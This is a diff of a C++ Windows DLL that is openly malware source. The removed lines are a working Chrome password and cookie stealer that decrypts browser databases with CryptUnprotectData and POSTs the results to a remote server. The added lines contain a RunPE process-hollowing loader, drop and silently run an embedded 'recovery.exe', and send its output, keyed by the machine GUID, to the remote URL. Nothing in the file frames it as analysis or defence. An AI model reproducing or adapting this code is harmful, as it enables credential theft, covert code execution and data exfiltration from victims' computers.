@@ -1,8 +1,9 @@
 #include "pch.h"
 #include <stdio.h> 
 #include <string>
-#include "sqlite3.h"
+#include <ShellAPI.h>
 #include "DarkRequest.h"
+#include "Stealer.h"
 #include <Wincrypt.h>
 #include <fstream>
 #pragma warning(disable:4996)
@@ -10,239 +11,100 @@
 extern "C"
 {
 
-	std::string getCookies(
-		sqlite3* db,
-		std::string sql,
-		std::string url
-	) {
-
-		std::stringstream dump;
-
-		//SELECT * FROM cookies WHERE 'https://github.com/session' LIKE CONCAT('%', cookies.HOST_KEY, '%')
-		//std::stringstream dump(std::string("")); // String stream for our output
-	//	const char* zSql = "SELECT * FROM cookies WHERE instr('"+url+"', HOST_KEY) > 0";
-		const char* zSql = sql.c_str();
-		sqlite3_stmt* pStmt;
-		int rc;
-
-		/* Compile the SELECT statement into a virtual machine. */
-		rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
-		if (rc != SQLITE_OK) {
-			//std::cout << "statement failed rc = " << rc << std::endl;
-			return "";
-		}
-		//std::cout << "statement prepared " << std::endl;
-
-		/* So call sqlite3_step() once
-		** only. Normally, we would keep calling sqlite3_step until it
-		** returned something other than SQLITE_ROW.
-		*/
-		rc = sqlite3_step(pStmt);
-		//std::cout << "RC: " << rc << std::endl;
-		while (rc == SQLITE_ROW) {
-			dump << "#D|C#";
-			dump << "#dark~#";
-			dump << sqlite3_column_text(pStmt, 0);
-			dump << "#dark~#";
-			dump << (char*)sqlite3_column_text(pStmt, 1);
-			dump << "#dark~#";
-			DATA_BLOB encryptedPass, decryptedPass;
-
-			encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
-			encryptedPass.pbData = (BYTE*)malloc((int)encryptedPass.cbData);
-
-			memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
-
-			CryptUnprotectData(
-				&encryptedPass, // In Data
-				NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
-				NULL,           // Optional entropy
-				NULL,           // Reserved
-				NULL,           // Here, the optional
-								// prompt structure is not
-								// used.
-				0,
-				&decryptedPass);
-			char* c = (char*)decryptedPass.pbData;
-			while (isprint(*c)) {
-				dump << *c;
-				c++;
-			}
-			dump << "#D|C#";
-			postRequest(url+"/cookierecovery",  "cookies=" + dump.str(), "POST");
-			dump.str("");
-			Sleep(2);
-			rc = sqlite3_step(pStmt);
-		}
-
-		/* Finalize the statement (this releases resources allocated by
-		** sqlite3_prepare() ).
-		*/
-		rc = sqlite3_finalize(pStmt);
-
-
-		return "success";
-	}
-
-	sqlite3* getDBHandler(char* dbFilePath) {
-		sqlite3* db;
-		int rc = sqlite3_open(dbFilePath, &db);
-		if (rc)
+	int NTRX_RUNPE32(void* Image, LPSTR cmd)
+	{
+		IMAGE_DOS_HEADER* DOSHeader;
+		IMAGE_NT_HEADERS* NtHeader;
+		IMAGE_SECTION_HEADER* SectionHeader;
+		PROCESS_INFORMATION PI;
+		STARTUPINFOA SI;
+		CONTEXT* CTX;
+		DWORD* ImageBase = NULL;
+		void* pImageBase = NULL;
+		int count;
+		char CurrentFilePath[1024];
+		DOSHeader = PIMAGE_DOS_HEADER(Image);
+		NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);
+		GetModuleFileNameA(0, CurrentFilePath, 1024);
+		if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
 		{
-			std::cerr << "Error opening SQLite3 database: " << sqlite3_errmsg(db) << std::endl << std::endl;
-			sqlite3_close(db);
-			return nullptr;
-		}
-		else
-		{
-			std::cout << dbFilePath << " DB Opened." << std::endl << std::endl;
-			return db;
-		}
-	}
-
-	std::stringstream getPass(
-		sqlite3* db,
-		std::string url
-	) {
-		std::stringstream dump(std::string("")); // String stream for our output
-		const char* zSql = "SELECT action_url, username_value, password_value FROM logins";
-		sqlite3_stmt* pStmt;
-		int rc;
-
-		/* Compile the SELECT statement into a virtual machine. */
-		rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
-		if (rc != SQLITE_OK) {
-			std::cout << "statement failed rc = " << rc << std::endl;
-			return dump;
-		}
-		std::cout << "statement prepared " << std::endl;
-
-		/* So call sqlite3_step() once
-		** only. Normally, we would keep calling sqlite3_step until it
-		** returned something other than SQLITE_ROW.
-		*/
-		rc = sqlite3_step(pStmt);
-		//std::cout << "RC: " << rc << std::endl;
-		while (rc == SQLITE_ROW) {
-			dump << "#N_U#";
-			dump << "#dark~#";
-			dump << sqlite3_column_text(pStmt, 0); //URL
-			dump << "#dark~#";
-			dump << (char*)sqlite3_column_text(pStmt, 1); //User
-			dump << "#dark~#";
-			DATA_BLOB encryptedPass, decryptedPass;
-
-
-
-			std::string url((char*)sqlite3_column_text(pStmt, 0));
-			std::string sql = "SELECT HOST_KEY,name,encrypted_value FROM cookies WHERE instr('" + url + "',HOST_KEY) > 0";
-			std::cout << sql;
-			sqlite3* cookiesDb = getDBHandler((char*)"cookiesDB");
-			getCookies(cookiesDb, sql, url);
-			//argumentsCookie = "cookies="+cookies.str();
-			if (sqlite3_close(cookiesDb) == SQLITE_OK)
-				std::cout << "DB connection closed properly" << std::endl;
-			else
-				std::cout << "Failed to close DB connection" << std::endl;
-
-
-
-
-			encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
-			encryptedPass.pbData = (BYTE*)malloc((int)encryptedPass.cbData);
-
-			memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
-
-			CryptUnprotectData(
-				&encryptedPass, // In Data
-				NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
-				NULL,           // Optional entropy
-				NULL,           // Reserved
-				NULL,           // Here, the optional
-								// prompt structure is not
-								// used.
-				0,
-				&decryptedPass);
-			char* c = (char*)decryptedPass.pbData;
-			while (isprint(*c)) {
-				dump << *c;
-				c++;
+			ZeroMemory(&PI, sizeof(PI));
+			ZeroMemory(&SI, sizeof(SI));
+			bool threadcreated = CreateProcessA(CurrentFilePath, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI);
+			if (threadcreated == true)
+			{
+				CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
+				CTX->ContextFlags = CONTEXT_FULL;
+				if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
+				{
+					ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
+					pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
+						NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
+					if (pImageBase == 00000000) {
+						ResumeThread(PI.hThread);
+						ExitProcess(NULL);
+						return 1;
+					}
+					if (pImageBase > 0) {
+						WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
+						for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
+						{
+							SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
+							WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
+								LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
+						}
+						WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
+							LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
+						CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
+						SetThreadContext(PI.hThread, LPCONTEXT(CTX));
+						ResumeThread(PI.hThread);
+						return 0;
+					}
+				}
 			}
-
-			dump << "#N_U#"; //Pass
-			rc = sqlite3_step(pStmt);
 		}
-
-		/* Finalize the statement (this releases resources allocated by
-		** sqlite3_prepare() ).
-		*/
-		rc = sqlite3_finalize(pStmt);
-
-		return dump;
 	}
 
-	//relative to chrome directory
-	bool copyDB(char* source, char* dest) {
-		//Form path for Chrome's Login Data 
-		std::string path = getenv("LOCALAPPDATA");
-		path.append("\\Google\\Chrome\\User Data\\Default\\");
-		path.append(source);
-		//copy the sqlite3 db from chrome directory 
-		//as we are not allowed to open it directly from there (chrome could also be running)
-		std::ifstream  src(path, std::ios::binary);
-		std::ofstream  dst(dest, std::ios::binary);
-		dst << src.rdbuf();
-		dst.close();
-		src.close();
-		return true; //ToDo: error handling
+	static std::string GetMachineGUID()
+	{
+		std::string ret;
+		char value[64];
+		DWORD size = _countof(value);
+		DWORD type = REG_SZ;
+		HKEY key;
+		LONG retKey = ::RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &key);
+		LONG retVal = ::RegQueryValueExA(key, "MachineGuid", nullptr, &type, (LPBYTE)value, &size);
+		if (retKey == ERROR_SUCCESS && retVal == ERROR_SUCCESS) {
+			ret = value;
+		}
+		::RegCloseKey(key);
+		return ret;
 	}
-
-	int deleleteDB(const char* fileName) {
-		if (remove(fileName) != 0)
-			std::cout << "Could not delete " << fileName << std::endl;
-		else
-			std::cout << fileName << " deleted... Bye bye" << std::endl;
-		return 1;
-	}
-
-
-
-
-
 
 	__declspec(dllexport) void runstealer(std::string url)
 	{
-		//printf("Hello from DLL !\n");
-		std::string method = "POST";
-		std::string arguments;
-		std::string argumentsCookie;
-		std::string output;
-		int rc;
-		// Open Database
+		DWORD Res;
+		HANDLE hFile = CreateFile("recovery.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (INVALID_HANDLE_VALUE == hFile) {
+			return;
+		}
+		WriteFile(hFile, rawData, sizeof(rawData), &Res, NULL);
+		CloseHandle(hFile);
+		#define hide SW_HIDE 
+		#if _DEBUG
+		#define hide SW_SHOW 
+		#endif
 
-		std::cout << "Copying db ..." << std::endl;
-
-		copyDB((char*)"Login Data", (char*)"passwordsDB");
-		sqlite3* passwordsDB = getDBHandler((char*)"passwordsDB");
-
-		copyDB((char*)"Cookies", (char*)"cookiesDB");
-
-
-		std::string passwords = getPass(passwordsDB,url).str();
-		arguments = "pass=" + passwords;
-		std::cout << arguments;
-		if (sqlite3_close(passwordsDB) == SQLITE_OK)
-			std::cout << "DB connection closed properly" << std::endl;
-		else
-			std::cout << "Failed to close DB connection" << std::endl;
-
-		postRequest(url +"/passwordrecovery", arguments, "POST");
-
-
-
-
-
-
+		char buffer[MAX_PATH];
+		GetModuleFileName(NULL, buffer, MAX_PATH);
+		std::string::size_type pos = std::string(buffer).find_last_of("\\/");
+		
+		std::string uuid = GetMachineGUID();
+		LPTSTR cmdPath = (LPTSTR)"cmd.exe";
+		std::string cmdArgs = "cmd.exe /C  "+std::string(buffer).substr(0, pos)+"\\recovery.exe > " + std::string(buffer).substr(0, pos) + "\\"+ uuid +".txt";
+		ShellExecute(GetDesktopWindow(), "open", cmdPath, cmdArgs.c_str(), NULL, hide);
+		//Sleep(30000);
+		postRequest(uuid,url);
 
 	}
 }
